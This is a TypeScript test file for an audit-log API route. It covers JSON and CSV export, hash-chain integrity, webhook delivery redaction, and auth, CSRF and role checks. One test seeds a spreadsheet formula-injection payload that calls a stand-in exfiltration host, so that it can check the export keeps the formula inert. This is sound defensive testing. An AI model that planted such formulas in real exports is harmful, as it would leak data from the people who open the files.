import { createHash } from "node:crypto";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { describe, expect, it, vi } from "vitest";

/**
 * FA22-04. `/api/sena/governance/audit` had three files asserting things *about*
 * it — a mocked-fetch URL in workspace-enterprise-ops-actions, evidence strings
 * in enterprise.test, a route-facts row — and nothing that ever called GET or
 * POST. These specs invoke the exported handlers and assert status *and* body
 * shape for: the default read, `?format=csv`, `?integrity=1`, the POST delivery
 * handler, and the unauthenticated/unauthorised form of each.
 *
 * Three assertions below deliberately pin behaviour this file considers wrong.
 * They are marked DEFECT and say what the handler should do instead; they exist
 * so the next change to the route is a decision rather than an accident.
 */

const auditUrl = "https://sena.example.test/api/sena/governance/audit";
const strongPassword = "sena-secure-123";

type AuditEntry = {
  id: string;
  event: string;
  userId?: string;
  teamId?: string;
  projectId?: string;
  createdAt: string;
  detail: Record<string, unknown>;
  webhookDelivery?: {
    provider?: string;
    status?: string;
    endpointHash?: string;
    attempts?: number;
    maxAttempts?: number;
  };
};

type AuditIntegrityBody = {
  schemaVersion?: string;
  generatedAt?: string;
  status?: string;
  scope?: { teamIds?: string[]; requestedTeamId?: string };
  retention?: {
    maxEvents?: number;
    retainedEvents?: number;
    oldestEventAt?: string;
    newestEventAt?: string;
    retentionWindowDays?: number;
    withinConfiguredWindow?: boolean;
  };
  chain?: {
    algorithm?: string;
    eventCount?: number;
    headHash?: string;
    firstEventHash?: string;
    lastEventHash?: string;
  };
  checks?: Array<{ id?: string; label?: string; status?: string; evidence?: string[]; nextAction?: string }>;
  sample?: Array<{ id?: string; event?: string; createdAt?: string; entryHash?: string; chainHash?: string }>;
};

type AuditLogBody = {
  schemaVersion?: string;
  generatedAt?: string;
  scope?: { teamIds?: string[]; requestedTeamId?: string };
  filters?: Record<string, unknown>;
  pagination?: {
    limit?: number;
    offset?: number;
    total?: number;
    returned?: number;
    nextOffset?: number | null;
  };
  events?: AuditEntry[];
  integrity?: AuditIntegrityBody;
};

type AuditDeliveryBody = {
  schemaVersion?: string;
  generatedAt?: string;
  provider?: {
    mode?: string;
    configured?: boolean;
    endpointHash?: string;
    secretConfigured?: boolean;
    timeoutMs?: number;
    maxAttempts?: number;
  };
  scope?: { teamIds?: string[]; requestedTeamId?: string };
  integrity?: AuditIntegrityBody;
  summary?: { attempted?: number; delivered?: number; pending?: number; failed?: number; skipped?: number };
  auditEvents?: Array<Record<string, unknown>>;
};

type ErrorBody = { error?: string; code?: string };

type AuditRouteHarness = {
  route: typeof import("../../../app/api/sena/governance/audit/route");
  enterprise: typeof import("../enterprise");
  state: typeof import("../enterprise/state");
  signIn: (token: string) => void;
  signOut: () => void;
};

const hex64 = /^[a-f0-9]{64}$/;
const isoTimestamp = /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z$/;

/**
 * Same temp-directory + aliased-module dance the SCIM and analysis route specs
 * run, plus the session cookie the audit route reads through `requireApiSession`.
 * `env` is applied before the dynamic imports because ops-audit captures the
 * enterprise db path at module load.
 */
async function withAuditRoute<T>(
  prefix: string,
  run: (harness: AuditRouteHarness) => Promise<T>,
  env: Record<string, string> = {}
) {
  const enterpriseDbDir = mkdtempSync(path.join(tmpdir(), prefix));
  let sessionToken = "";
  vi.resetModules();
  process.env.SENA_ENTERPRISE_DB_DIR = enterpriseDbDir;
  for (const [key, value] of Object.entries(env)) {
    vi.stubEnv(key, value);
  }
  vi.doMock("next/headers", () => ({
    cookies: () => ({
      get: (name: string) => (name === "sena_session" && sessionToken ? { value: sessionToken } : undefined)
    })
  }));
  vi.doMock("@/lib/sena/enterprise", async () => await import("../enterprise"));
  vi.doMock("@/lib/sena/enterprise/ops-audit", async () => await import("../enterprise/ops-audit"));
  vi.doMock("@/lib/sena/enterprise/errors", async () => await import("../enterprise/errors"));
  vi.doMock("@/lib/sena/api-helpers", async () => await import("../api-helpers"));

  try {
    return await run({
      route: await import("../../../app/api/sena/governance/audit/route"),
      enterprise: await import("../enterprise"),
      state: await import("../enterprise/state"),
      signIn: (token: string) => {
        sessionToken = token;
      },
      signOut: () => {
        sessionToken = "";
      }
    });
  } finally {
    vi.doUnmock("next/headers");
    vi.unstubAllEnvs();
    vi.unstubAllGlobals();
    delete process.env.SENA_ENTERPRISE_DB_DIR;
    rmSync(enterpriseDbDir, { recursive: true, force: true });
    vi.resetModules();
  }
}

function seedAuditOwner(enterprise: AuditRouteHarness["enterprise"], slug: string) {
  return enterprise.registerEnterpriseUser({
    name: `Audit Owner ${slug}`,
    email: `audit-owner-${slug}@example.edu`,
    password: strongPassword,
    organization: `Audit Lab ${slug}`,
    plan: "enterprise"
  });
}

const readRequest = (url = auditUrl) => new Request(url);

const csvRows = (body: string) => body.split("\n");

describe("SENA governance audit route GET", () => {
  it("answers the default read with a scoped audit-log envelope", async () => {
    await withAuditRoute("sena-governance-audit-get-", async ({ route, enterprise, signIn }) => {
      const owner = seedAuditOwner(enterprise, "default");
      const teamId = owner.context.teams[0].id;
      signIn(owner.token);

      const response = await route.GET(readRequest());
      const body = await response.json() as AuditLogBody;

      expect(response.status).toBe(200);
      expect(response.headers.get("content-type")).toContain("application/json");
      expect(response.headers.get("x-sena-observed-route")).toBe("sena-governance-audit");
      expect(response.headers.get("x-sena-observed-status-class")).toBe("2xx");

      // Shape, not just status: a 200 carrying an empty object would satisfy a
      // status-only assertion and tell an operator nothing.
      expect(body.schemaVersion).toBe("sena-enterprise-audit-log/v1");
      expect(body.generatedAt).toMatch(isoTimestamp);
      expect(body.scope).toEqual({ teamIds: [teamId] });
      expect(body.filters).toEqual({});
      expect(body.pagination).toEqual({
        limit: 100,
        offset: 0,
        total: 1,
        returned: 1,
        nextOffset: null
      });
      expect(body.events).toHaveLength(1);
      expect(body.events?.[0]).toEqual(expect.objectContaining({
        id: expect.stringMatching(/^audit_[a-f0-9]{24}$/),
        event: "auth.register",
        userId: owner.context.user.id,
        teamId,
        createdAt: expect.stringMatching(isoTimestamp),
        detail: expect.objectContaining({ plan: "enterprise", role: "owner" })
      }));
      // Integrity is opt-in, so the default read must not carry it.
      expect("integrity" in body).toBe(false);
    });
  });

  it("applies the event filter and refuses an unknown event with a 400 code", async () => {
    await withAuditRoute("sena-governance-audit-filter-", async ({ route, enterprise, signIn }) => {
      const owner = seedAuditOwner(enterprise, "filter");
      const teamId = owner.context.teams[0].id;
      signIn(owner.token);
      enterprise.recordEnterpriseAudit({
        event: "project.create",
        userId: owner.context.user.id,
        teamId,
        detail: { projectTitle: "Filtered Project" }
      });

      const filtered = await route.GET(readRequest(`${auditUrl}?event=project.create&limit=5`));
      const filteredBody = await filtered.json() as AuditLogBody;
      expect(filtered.status).toBe(200);
      expect(filteredBody.filters).toEqual({ event: "project.create" });
      expect(filteredBody.pagination).toEqual({
        limit: 5,
        offset: 0,
        total: 1,
        returned: 1,
        nextOffset: null
      });
      expect(filteredBody.events?.map((entry) => entry.event)).toEqual(["project.create"]);

      // An unrecognised filter is a caller mistake, not a server fault: it has to
      // land as a 4xx with a code the UI can branch on, and it must not degrade
      // to "return everything".
      const refused = await route.GET(readRequest(`${auditUrl}?event=project.invent`));
      const refusedBody = await refused.json() as ErrorBody & { events?: unknown };
      expect(refused.status).toBe(400);
      expect(refusedBody.code).toBe("unsupported_audit_event");
      expect(refusedBody.error).toBeTruthy();
      expect(refusedBody.events).toBeUndefined();
      expect(refused.headers.get("x-sena-observed-status-class")).toBe("4xx");

      // Same for a malformed date filter, which the lib raises from a different
      // call site.
      const badDate = await route.GET(readRequest(`${auditUrl}?from=not-a-date`));
      expect(badDate.status).toBe(400);
      expect((await badDate.json() as ErrorBody).code).toBe("invalid_audit_date");
    });
  });

  it("returns the audit integrity payload when integrity=1 is asked for", async () => {
    await withAuditRoute("sena-governance-audit-integrity-", async ({ route, enterprise, signIn }) => {
      const owner = seedAuditOwner(enterprise, "integrity");
      const teamId = owner.context.teams[0].id;
      signIn(owner.token);
      enterprise.recordEnterpriseAudit({
        event: "project.create",
        userId: owner.context.user.id,
        teamId,
        detail: { projectTitle: "Integrity Project" }
      });

      const response = await route.GET(readRequest(`${auditUrl}?integrity=1`));
      const body = await response.json() as AuditLogBody;
      const integrity = body.integrity;

      expect(response.status).toBe(200);
      expect(body.schemaVersion).toBe("sena-enterprise-audit-log/v1");
      expect(integrity?.schemaVersion).toBe("sena-enterprise-audit-integrity/v1");
      expect(integrity?.scope).toEqual({ teamIds: [teamId] });
      expect(integrity?.chain).toEqual({
        algorithm: "sha256-linked-audit-entry-hash",
        eventCount: 2,
        headHash: expect.stringMatching(hex64),
        firstEventHash: expect.stringMatching(hex64),
        lastEventHash: expect.stringMatching(hex64)
      });
      expect(integrity?.retention).toEqual(expect.objectContaining({
        maxEvents: 5000,
        retainedEvents: 2,
        oldestEventAt: expect.stringMatching(isoTimestamp),
        newestEventAt: expect.stringMatching(isoTimestamp),
        withinConfiguredWindow: false
      }));
      expect(integrity?.checks?.map((check) => check.id)).toEqual([
        "audit-chain-hash",
        "audit-event-order",
        "audit-retention-cap",
        "audit-retention-window"
      ]);
      // Retention days are unset here, so the surface must say "review" rather
      // than reporting a clean audit chain the deployment has not earned.
      expect(integrity?.status).toBe("review");
      expect(integrity?.checks?.find((check) => check.id === "audit-retention-window")?.status).toBe("review");
      expect(integrity?.sample).toHaveLength(2);
      expect(integrity?.sample?.[0]).toEqual({
        id: expect.stringMatching(/^audit_[a-f0-9]{24}$/),
        event: "project.create",
        createdAt: expect.stringMatching(isoTimestamp),
        entryHash: expect.stringMatching(hex64),
        chainHash: expect.stringMatching(hex64)
      });

      // integrity=true is the other spelling the handler accepts, and the chain
      // head has to be stable across two reads of an unchanged log.
      const alternate = await route.GET(readRequest(`${auditUrl}?integrity=true`));
      const alternateBody = await alternate.json() as AuditLogBody;
      expect(alternate.status).toBe(200);
      expect(alternateBody.integrity?.chain?.headHash).toBe(integrity?.chain?.headHash);

      // Anything other than 1/true is not an opt-in.
      const off = await route.GET(readRequest(`${auditUrl}?integrity=0`));
      expect(off.status).toBe(200);
      expect("integrity" in (await off.json() as AuditLogBody)).toBe(false);
    });
  });

  it("reports a passing chain once a retention window is configured", async () => {
    await withAuditRoute("sena-governance-audit-retention-", async ({ route, enterprise, signIn }) => {
      const owner = seedAuditOwner(enterprise, "retention");
      signIn(owner.token);

      const response = await route.GET(readRequest(`${auditUrl}?integrity=1`));
      const integrity = (await response.json() as AuditLogBody).integrity;

      expect(response.status).toBe(200);
      expect(integrity?.status).toBe("pass");
      expect(integrity?.retention?.retentionWindowDays).toBe(30);
      expect(integrity?.retention?.withinConfiguredWindow).toBe(true);
      expect(integrity?.checks?.every((check) => check.status === "pass")).toBe(true);
    }, { SENA_AUDIT_RETENTION_DAYS: "30" });
  });
});

describe("SENA governance audit route CSV export", () => {
  it("returns genuine CSV with the documented header row and audits the export", async () => {
    await withAuditRoute("sena-governance-audit-csv-", async ({ route, enterprise, signIn }) => {
      const owner = seedAuditOwner(enterprise, "csv");
      const teamId = owner.context.teams[0].id;
      signIn(owner.token);
      enterprise.recordEnterpriseAudit({
        event: "project.create",
        userId: owner.context.user.id,
        teamId,
        projectId: "project_csv_fixture",
        detail: { projectTitle: 'Quoted "Title"' }
      });

      const response = await route.GET(readRequest(`${auditUrl}?format=csv&teamId=${teamId}`));
      const csv = await response.text();
      const rows = csvRows(csv);

      expect(response.status).toBe(200);
      expect(response.headers.get("content-type")).toBe("text/csv; charset=utf-8");
      expect(response.headers.get("content-disposition"))
        .toBe('attachment; filename="sena-enterprise-audit-log.csv"');
      expect(response.headers.get("x-sena-observed-route")).toBe("sena-governance-audit");

      // The body is the deliverable, so assert it is CSV rather than JSON that
      // merely arrived under a CSV content type.
      expect(csv.startsWith("{")).toBe(false);
      expect(rows[0]).toBe('"id","createdAt","event","userId","teamId","projectId","detail"');
      expect(rows).toHaveLength(3);
      expect(rows.every((row) => row.split(",").length >= 7)).toBe(true);

      const projectRow = rows.find((row) => row.includes('"project.create"'));
      expect(projectRow).toContain(`"${owner.context.user.id}"`);
      expect(projectRow).toContain(`"${teamId}"`);
      expect(projectRow).toContain('"project_csv_fixture"');
      // Embedded quotes are RFC 4180 doubled, not dropped or backslash-escaped.
      expect(projectRow).toContain('""projectTitle"":""Quoted \\""Title\\""""');

      // A row with no userId/projectId still emits the empty cells, so column
      // positions survive a mixed export.
      const registerRow = rows.find((row) => row.includes('"auth.register"'));
      expect(registerRow).toContain('"","{');

      // The export is itself an audited governance action.
      const afterExport = await route.GET(readRequest(`${auditUrl}?event=governance.audit.export`));
      const exportEvents = (await afterExport.json() as AuditLogBody).events ?? [];
      expect(exportEvents).toHaveLength(1);
      expect(exportEvents[0]).toEqual(expect.objectContaining({
        userId: owner.context.user.id,
        teamId,
        detail: expect.objectContaining({ format: "csv", events: 2, total: 2 })
      }));
    });
  });

  it("DEFECT: truncates the CSV export at the default page limit and says nothing", async () => {
    await withAuditRoute("sena-governance-audit-csv-truncation-", async ({ route, enterprise, state, signIn }) => {
      const owner = seedAuditOwner(enterprise, "truncation");
      const teamId = owner.context.teams[0].id;
      signIn(owner.token);
      const db = state.readEnterpriseDb();
      for (let index = 0; index < 149; index += 1) {
        enterprise.appendAudit(db, {
          event: "project.read",
          userId: owner.context.user.id,
          teamId,
          detail: { seq: index }
        });
      }
      state.saveDb(db);

      const json = await route.GET(readRequest(`${auditUrl}?teamId=${teamId}`));
      const jsonBody = await json.json() as AuditLogBody;
      expect(json.status).toBe(200);
      expect(jsonBody.pagination).toEqual({
        limit: 100,
        offset: 0,
        total: 150,
        returned: 100,
        nextOffset: 100
      });

      const csvResponse = await route.GET(readRequest(`${auditUrl}?format=csv&teamId=${teamId}`));
      const csv = await csvResponse.text();
      const rows = csvRows(csv);

      // What the handler does today. The shipped "Export audit CSV" button
      // (components/sena/workspace/enterprise-ops-actions.ts) sends no `limit`,
      // so `listEnterpriseAuditLogAsync` applies its default of 100 and
      // `auditCsv(result.events)` writes one page — 100 of 150 events — under
      // the filename sena-enterprise-audit-log.csv.
      expect(rows).toHaveLength(101);

      // DEFECT: nothing in the response distinguishes a complete export from a
      // truncated one. There is no trailing marker row, no `nextOffset`
      // anywhere in the CSV, and no response header carrying the total; the JSON
      // read above knows total=150 and the export audit entry records it, but
      // the artifact the operator archives does not. A retention or e-discovery
      // export silently missing its oldest 50 events is indistinguishable from a
      // complete one. Expected: either export the full scoped set for
      // format=csv, or surface total/returned on the response (header or marker
      // row) so truncation is visible. These assertions pin the gap; they do not
      // bless it.
      expect(csv).not.toContain("truncated");
      expect(csv).not.toContain("nextOffset");
      expect(rows.at(-1)).toContain('"project.read"');
      expect(auditPaginationHeaders(csvResponse)).toEqual({ total: null, returned: null, nextOffset: null });

      // An explicit limit is the only way to get the whole log out today. The
      // count is 151 rather than 150 because the export above appended its own
      // governance.audit.export entry — recorded after that export's page was
      // taken, so an export never contains its own record.
      const full = await (await route.GET(readRequest(`${auditUrl}?format=csv&limit=500&teamId=${teamId}`))).text();
      expect(csvRows(full)).toHaveLength(152);
      expect(full).toContain('"governance.audit.export"');
    });
  });

  it("DEFECT: computes the integrity payload for format=csv and then discards it", async () => {
    await withAuditRoute("sena-governance-audit-csv-integrity-", async ({ route, enterprise, signIn }) => {
      const owner = seedAuditOwner(enterprise, "csv-integrity");
      const teamId = owner.context.teams[0].id;
      signIn(owner.token);

      const chainHead = (await (await route.GET(readRequest(`${auditUrl}?integrity=1&teamId=${teamId}`)))
        .json() as AuditLogBody).integrity?.chain?.headHash;
      expect(chainHead).toMatch(hex64);

      // This is the exact URL the workspace CSV-export button builds.
      const response = await route.GET(readRequest(`${auditUrl}?format=csv&integrity=1&teamId=${teamId}`));
      const csv = await response.text();

      expect(response.status).toBe(200);
      expect(response.headers.get("content-type")).toBe("text/csv; charset=utf-8");

      // DEFECT: GET runs `verifyEnterpriseAuditIntegrityAsync` — a full
      // chain hash over every scoped event — before the format branch, then the
      // CSV branch returns without using it. So `integrity=1` on a CSV export
      // costs the work and delivers nothing: the exported artifact carries no
      // chain head, and lib/sena/api-evidence-notes.ts nonetheless documents
      // this surface as one that exposes "chain-head evidence". Expected:
      // either emit the chain head with the export (an x-sena-audit-chain-head
      // header is enough) or skip the computation on the CSV path. Pinned, not
      // blessed.
      expect(csv).not.toContain(chainHead as string);
      expect(csv.split("\n")[0]).toBe('"id","createdAt","event","userId","teamId","projectId","detail"');
      expect(response.headers.get("x-sena-audit-chain-head")).toBeNull();
      expect([...response.headers.keys()].some((header) => header.includes("integrity"))).toBe(false);
    });
  });

  it("keeps attacker-controlled audit detail inert in the exported spreadsheet", async () => {
    await withAuditRoute("sena-governance-audit-csv-injection-", async ({ route, enterprise, signIn }) => {
      const owner = seedAuditOwner(enterprise, "injection");
      const teamId = owner.context.teams[0].id;
      const invitation = enterprise.createEnterpriseInvitation(owner.context, {
        teamId,
        email: "audit-csv-injection-guest@example.edu",
        role: "coder"
      });
      // `selfDeclaredRole` is free text the registrant chooses; auth-registration
      // records it verbatim (trimmed to 80 chars) on the auth.register audit
      // entry, and the invite code puts that entry in the owner's team scope.
      enterprise.registerEnterpriseUser({
        name: "Audit CSV Guest",
        email: "audit-csv-injection-guest@example.edu",
        password: strongPassword,
        organization: `Audit Lab injection`,
        inviteCode: invitation.inviteCode,
        selfDeclaredRole: '=HYPERLINK("https://exfil.example/"&A2,"Open")'
      });
      signIn(owner.token);

      const csv = await (await route.GET(readRequest(`${auditUrl}?format=csv&teamId=${teamId}`))).text();
      const rows = csvRows(csv).slice(1);

      // Quoting a field is not formula neutralisation — Excel, Numbers and
      // LibreOffice all evaluate a *quoted* cell whose content starts with
      // = + - @. What actually keeps this export inert is that `csvCell` runs
      // the only attacker-controlled column through JSON.stringify, so the
      // detail cell always opens with `{` and the payload is stranded mid-cell.
      // That is load-bearing and undocumented, so pin it: if the detail column
      // is ever flattened into plain columns, this fails and the export needs a
      // real `'`-prefix guard.
      expect(csv).toContain('""selfDeclaredRole"":""=HYPERLINK(');
      const cells = rows.flatMap((row) => row.split('","'));
      expect(cells.length).toBeGreaterThan(0);
      expect(cells.every((cell) => !/^"?[=+@]/.test(cell))).toBe(true);
      expect(rows.every((row) => row.endsWith('"') && row.includes(',"{'))).toBe(true);
    });
  });
});

describe("SENA governance audit route POST delivery", () => {
  it("answers an unconfigured delivery with an empty delivery envelope", async () => {
    await withAuditRoute("sena-governance-audit-post-", async ({ route, enterprise, signIn }) => {
      const owner = seedAuditOwner(enterprise, "post");
      const teamId = owner.context.teams[0].id;
      signIn(owner.token);
      const csrf = enterprise.createEnterpriseCsrfToken(owner.context);

      const response = await route.POST(new Request(auditUrl, {
        method: "POST",
        headers: { "content-type": "application/json", [csrf.headerName]: csrf.token },
        body: JSON.stringify({ teamId, limit: 10 })
      }));
      const body = await response.json() as AuditDeliveryBody;

      expect(response.status).toBe(200);
      expect(response.headers.get("x-sena-observed-route")).toBe("sena-governance-audit");
      expect(response.headers.get("x-sena-observed-status-class")).toBe("2xx");
      expect(body.schemaVersion).toBe("sena-enterprise-audit-delivery/v1");
      expect(body.provider).toEqual({
        mode: "not-configured",
        configured: false,
        secretConfigured: false,
        timeoutMs: 5000,
        maxAttempts: 3
      });
      expect(body.scope).toEqual({ teamIds: [teamId], requestedTeamId: teamId });
      expect(body.summary).toEqual({ attempted: 0, delivered: 0, pending: 0, failed: 0, skipped: 0 });
      expect(body.auditEvents).toEqual([]);
      // The delivery answer still carries the chain evidence a SIEM operator
      // needs to tell which log they failed to forward.
      expect(body.integrity?.schemaVersion).toBe("sena-enterprise-audit-integrity/v1");
      expect(body.integrity?.chain?.headHash).toMatch(hex64);
    });
  });

  it("forwards queued audit events and reports hashed endpoint evidence only", async () => {
    const webhookUrl = "https://audit-sink.example.test/sena";
    const webhookSecret = "sena-audit-webhook-secret-value";
    const endpointHash = createHash("sha256").update(webhookUrl).digest("hex");

    await withAuditRoute("sena-governance-audit-deliver-", async ({ route, enterprise, signIn }) => {
      const forwarded: Array<{ url: string; headers: Record<string, string>; body: string }> = [];
      vi.stubGlobal("fetch", vi.fn(async (input: RequestInfo | URL, init?: RequestInit) => {
        forwarded.push({
          url: String(input),
          headers: (init?.headers ?? {}) as Record<string, string>,
          body: String(init?.body ?? "")
        });
        return new Response(null, { status: 204 });
      }));

      const owner = seedAuditOwner(enterprise, "deliver");
      const teamId = owner.context.teams[0].id;
      signIn(owner.token);
      enterprise.recordEnterpriseAudit({
        event: "team.invite",
        userId: owner.context.user.id,
        teamId,
        detail: { email: "forwarded-guest@example.edu", apiToken: "forwarded-plaintext-token", role: "coder" }
      });
      const csrf = enterprise.createEnterpriseCsrfToken(owner.context);

      const response = await route.POST(new Request(auditUrl, {
        method: "POST",
        headers: { "content-type": "application/json", [csrf.headerName]: csrf.token },
        body: JSON.stringify({ teamId })
      }));
      const body = await response.json() as AuditDeliveryBody;
      const serialized = JSON.stringify(body);

      expect(response.status).toBe(200);
      expect(body.provider).toEqual({
        mode: "webhook",
        configured: true,
        endpointHash,
        secretConfigured: true,
        timeoutMs: 5000,
        maxAttempts: 3
      });
      expect(body.summary).toEqual({ attempted: 2, delivered: 2, pending: 0, failed: 0, skipped: 0 });
      expect(body.auditEvents).toHaveLength(2);
      expect(body.auditEvents?.map((entry) => entry.event)).toEqual(["auth.register", "team.invite"]);
      expect(body.auditEvents?.[1]).toEqual({
        auditId: expect.stringMatching(/^audit_[a-f0-9]{24}$/),
        event: "team.invite",
        teamId,
        webhookStatus: "delivered",
        attempts: 1,
        httpStatus: 204
      });

      // Redaction, route level. The delivery report is a governance artifact of
      // its own: it names the endpoint only by hash, never quotes the secret,
      // and carries no audit `detail` at all — so a delivery summary cannot
      // become a second copy of the log it forwarded.
      expect(serialized).not.toContain(webhookUrl);
      expect(serialized).not.toContain("audit-sink.example.test");
      expect(serialized).not.toContain(webhookSecret);
      expect(serialized).not.toContain("forwarded-plaintext-token");
      expect(serialized).not.toContain("forwarded-guest@example.edu");
      expect(body.auditEvents?.every((entry) => !("detail" in entry))).toBe(true);

      // ...and the forward itself preserves the lib-level sanitisation: the
      // email is hashed plus domain-summarised and the token is hashed, exactly
      // as sanitizedAuditForwardDetail does, rather than shipped in the clear.
      expect(forwarded).toHaveLength(2);
      const invitePayload = JSON.parse(forwarded[1].body) as {
        audit?: { detail?: Record<string, unknown>; chainHead?: string };
      };
      expect(forwarded[1].url).toBe(webhookUrl);
      expect(forwarded[1].headers["x-sena-webhook-signature"]).toMatch(/^sha256=[a-f0-9]{64}$/);
      expect(invitePayload.audit?.detail).toEqual({
        emailHash: createHash("sha256").update("forwarded-guest@example.edu").digest("hex"),
        emailDomain: "example.edu",
        apiTokenHash: createHash("sha256").update("forwarded-plaintext-token").digest("hex"),
        role: "coder"
      });
      expect(forwarded[1].body).not.toContain("forwarded-guest@example.edu");
      expect(forwarded[1].body).not.toContain("forwarded-plaintext-token");

      // The GET read of the same log names the endpoint by hash too.
      const listed = await route.GET(readRequest(`${auditUrl}?teamId=${teamId}`));
      const listedBody = await listed.json() as AuditLogBody;
      const listedText = JSON.stringify(listedBody);
      expect(listed.status).toBe(200);
      expect(listedBody.events?.[0]?.webhookDelivery).toEqual(expect.objectContaining({
        provider: "webhook",
        status: "delivered",
        endpointHash,
        attempts: 1,
        maxAttempts: 3
      }));
      expect(listedText).not.toContain(webhookUrl);
      expect(listedText).not.toContain(webhookSecret);
      expect(listedText).not.toContain(owner.token);
      expect(listedText).not.toContain(strongPassword);
      expect(listedText).not.toContain("passwordHash");

      // A second delivery is a no-op rather than a duplicate forward.
      const replay = await route.POST(new Request(auditUrl, {
        method: "POST",
        headers: { "content-type": "application/json", [csrf.headerName]: csrf.token },
        body: JSON.stringify({ teamId })
      }));
      const replayBody = await replay.json() as AuditDeliveryBody;
      expect(replay.status).toBe(200);
      expect(replayBody.summary?.attempted).toBe(0);
      expect(replayBody.summary?.skipped).toBeGreaterThanOrEqual(2);
      expect(forwarded).toHaveLength(2);
    }, {
      SENA_AUDIT_WEBHOOK_URL: webhookUrl,
      SENA_AUDIT_WEBHOOK_SECRET: webhookSecret
    });
  });

  it("accepts an empty POST body and scopes the delivery to every manageable team", async () => {
    await withAuditRoute("sena-governance-audit-post-empty-", async ({ route, enterprise, signIn }) => {
      const owner = seedAuditOwner(enterprise, "post-empty");
      const teamId = owner.context.teams[0].id;
      signIn(owner.token);
      const csrf = enterprise.createEnterpriseCsrfToken(owner.context);

      // No content-type, no body: `request.json()` rejects and the handler falls
      // back to {} rather than 500ing.
      const response = await route.POST(new Request(auditUrl, {
        method: "POST",
        headers: { [csrf.headerName]: csrf.token }
      }));
      const body = await response.json() as AuditDeliveryBody;

      expect(response.status).toBe(200);
      expect(body.schemaVersion).toBe("sena-enterprise-audit-delivery/v1");
      expect(body.scope).toEqual({ teamIds: [teamId] });
      expect(body.summary).toEqual({ attempted: 0, delivered: 0, pending: 0, failed: 0, skipped: 0 });
    });
  });
});

describe("SENA governance audit route access gate", () => {
  it("refuses every unauthenticated shape of the surface with 401 auth_required", async () => {
    await withAuditRoute("sena-governance-audit-anon-", async ({ route, enterprise, signOut }) => {
      seedAuditOwner(enterprise, "anon");
      signOut();

      const anonymousReads = [
        auditUrl,
        `${auditUrl}?format=csv`,
        `${auditUrl}?integrity=1`,
        `${auditUrl}?format=csv&integrity=1`
      ];
      for (const url of anonymousReads) {
        const response = await route.GET(readRequest(url));
        const body = await response.json() as ErrorBody & { events?: unknown };
        // A 4xx with a code, never a 500 and never a partial log.
        expect([url, response.status]).toEqual([url, 401]);
        expect([url, body.code]).toEqual([url, "auth_required"]);
        expect(body.error).toBeTruthy();
        expect(body.events).toBeUndefined();
        expect(response.headers.get("x-sena-observed-status-class")).toBe("4xx");
        // The refusal is JSON even on the CSV path, so no caller can mistake an
        // error page for an export.
        expect(response.headers.get("content-type")).toContain("application/json");
        expect(response.headers.get("content-disposition")).toBeNull();
      }

      const posted = await route.POST(new Request(auditUrl, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ limit: 5 })
      }));
      const postedBody = await posted.json() as ErrorBody & { summary?: unknown };
      expect(posted.status).toBe(401);
      expect(postedBody.code).toBe("auth_required");
      expect(postedBody.summary).toBeUndefined();
    });
  });

  it("refuses a signed-in POST that carries no CSRF token and audits the refusal", async () => {
    await withAuditRoute("sena-governance-audit-csrf-", async ({ route, enterprise, signIn }) => {
      const owner = seedAuditOwner(enterprise, "csrf");
      signIn(owner.token);

      const missing = await route.POST(new Request(auditUrl, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({})
      }));
      const missingBody = await missing.json() as ErrorBody & { summary?: unknown };
      expect(missing.status).toBe(403);
      expect(missingBody.code).toBe("csrf_invalid");
      expect(missingBody.summary).toBeUndefined();

      const wrong = await route.POST(new Request(auditUrl, {
        method: "POST",
        headers: { "content-type": "application/json", "x-sena-csrf-token": "not-the-token" },
        body: JSON.stringify({})
      }));
      expect(wrong.status).toBe(403);
      expect((await wrong.json() as ErrorBody).code).toBe("csrf_invalid");

      // The refused mutation is itself recorded, and the GET surface shows it.
      const listed = await route.GET(readRequest(`${auditUrl}?event=security.csrf.fail`));
      const listedBody = await listed.json() as AuditLogBody;
      expect(listed.status).toBe(200);
      expect(listedBody.events).toHaveLength(2);
      expect(listedBody.events?.[0]?.detail).toEqual(expect.objectContaining({
        tokenPresent: true,
        headerName: "x-sena-csrf-token"
      }));
      // The rejected token is stored by hash, so reading the audit log cannot
      // hand anyone a replayable value.
      expect(JSON.stringify(listedBody)).not.toContain("not-the-token");
    });
  });

  it("refuses a caller with no manageable team and a cross-team teamId", async () => {
    await withAuditRoute("sena-governance-audit-rbac-", async ({ route, enterprise, signIn }) => {
      const owner = seedAuditOwner(enterprise, "rbac");
      const teamId = owner.context.teams[0].id;
      const invitation = enterprise.createEnterpriseInvitation(owner.context, {
        teamId,
        email: "audit-rbac-coder@example.edu",
        role: "coder"
      });
      const coder = enterprise.registerEnterpriseUser({
        name: "Audit Coder",
        email: "audit-rbac-coder@example.edu",
        password: strongPassword,
        organization: "Audit Lab rbac",
        inviteCode: invitation.inviteCode
      });
      expect(coder.context.memberships.map((membership) => membership.role)).toEqual(["coder"]);

      signIn(coder.token);
      const denied = await route.GET(readRequest());
      const deniedBody = await denied.json() as ErrorBody & { events?: unknown };
      expect(denied.status).toBe(403);
      expect(deniedBody.code).toBe("audit_permission_denied");
      expect(deniedBody.events).toBeUndefined();

      // Naming the team explicitly must not route around the same gate.
      const namedTeam = await route.GET(readRequest(`${auditUrl}?teamId=${teamId}`));
      expect(namedTeam.status).toBe(403);
      expect((await namedTeam.json() as ErrorBody).code).toBe("permission_denied");

      const csvDenied = await route.GET(readRequest(`${auditUrl}?format=csv&teamId=${teamId}`));
      expect(csvDenied.status).toBe(403);
      expect(csvDenied.headers.get("content-type")).toContain("application/json");
      expect(await csvDenied.text()).not.toContain('"id","createdAt","event"');

      const csrf = enterprise.createEnterpriseCsrfToken(coder.context);
      const postDenied = await route.POST(new Request(auditUrl, {
        method: "POST",
        headers: { "content-type": "application/json", [csrf.headerName]: csrf.token },
        body: JSON.stringify({ teamId })
      }));
      expect(postDenied.status).toBe(403);
      expect((await postDenied.json() as ErrorBody).code).toBe("permission_denied");

      // An outsider who owns their own workspace still cannot read the lab's log.
      const outsider = enterprise.registerEnterpriseUser({
        name: "Audit Outsider",
        email: "audit-rbac-outsider@throwaway.example",
        password: strongPassword,
        organization: "Throwaway rbac"
      });
      signIn(outsider.token);
      const outsiderScoped = await route.GET(readRequest(`${auditUrl}?teamId=${teamId}`));
      expect(outsiderScoped.status).toBe(403);
      expect((await outsiderScoped.json() as ErrorBody).code).toBe("permission_denied");

